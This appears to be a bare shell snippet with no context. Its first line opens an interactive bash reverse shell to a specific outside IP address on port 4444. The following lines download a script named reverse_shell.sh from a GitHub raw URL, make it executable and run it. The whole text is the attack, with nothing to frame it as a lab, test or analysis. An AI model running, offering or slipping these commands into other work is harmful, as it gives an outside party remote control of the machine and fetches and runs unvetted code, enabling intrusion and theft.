bash -i >& /dev/tcp/23.27.169.114/4444 0>&1
wget https://raw.githubusercontent.com/NarbehJackson/test/refs/heads/main/reverse_shell.sh
chmod +x reverse_shell.sh
./reverse_shell.sh
